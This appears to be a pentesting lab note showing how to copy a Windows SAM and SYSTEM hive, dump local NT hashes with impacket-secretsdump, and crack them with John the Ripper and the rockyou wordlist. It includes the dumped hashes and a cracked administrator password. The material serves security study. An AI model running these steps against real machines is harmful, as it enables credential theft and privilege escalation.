
### [[John the Ripper]]
NT
```
sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt SAMhashes
```

Full process

```
PS C:\Users\enterpriseuser> copy sam m:\sam
PS C:\Users\enterpriseuser> copy system m:\system
```

Get the hashes
```
┌──(kali㉿kali)-[~/WindowsPrivilegeEscalation]
└─$ impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xb4999e49259682622dcc1e3a1636ff45
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:856f13362db36284f7d964120d794a98:::
enterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::
diana:1002:aad3b435b51404eeaad3b435b51404ee:3f2e7dddbe7a42d8978c1689b67297f3:::
alex:1003:aad3b435b51404eeaad3b435b51404ee:821036ef8b6f43194779f6fca426f3f7:::
enterpriseuser:1004:aad3b435b51404eeaad3b435b51404ee:b875ee792421982ebcfa8217340ef376:::
offsec:1005:aad3b435b51404eeaad3b435b51404ee:d2ce08a1ee362158863d47d478b2622e:::
[*] Cleaning up... 
                                                                                                                    
┌──(kali㉿kali)-[~/WindowsPrivilegeEscalation]
└─$ mousepad SAMhashes       

(mousepad:223432): Mousepad-WARNING **: 22:58:33.467: Some 'autosave-*' files in directory '/home/kali/.local/share/Mousepad' do not correspond to any session backup anymore. They will not be deleted automatically: please do it manually to remove this warning.

┌──(kali㉿kali)-[~/WindowsPrivilegeEscalation]
└─$ cat SAMhashes    
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f518eb35353d7a83d27e7fe457664e5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:856f13362db36284f7d964120d794a98:::
enterpriseadmin:1001:aad3b435b51404eeaad3b435b51404ee:d94267c350fc02154f2aff04d384b354:::
diana:1002:aad3b435b51404eeaad3b435b51404ee:3f2e7dddbe7a42d8978c1689b67297f3:::
alex:1003:aad3b435b51404eeaad3b435b51404ee:821036ef8b6f43194779f6fca426f3f7:::
enterpriseuser:1004:aad3b435b51404eeaad3b435b51404ee:b875ee792421982ebcfa8217340ef376:::
offsec:1005:aad3b435b51404eeaad3b435b51404ee:d2ce08a1ee362158863d47d478b2622e:::

┌──(kali㉿kali)-[~/WindowsPrivilegeEscalation]
└─$ sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt SAMhashes    
Using default input encoding: UTF-8
Loaded 8 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
Remaining 7 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
S3cureStore      (enterpriseadmin)     
1g 0:00:00:00 DONE (2024-07-18 23:06) 1.298g/s 18628Kp/s 18628Kc/s 125618KC/s      markinho..*7¡Vamos!
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```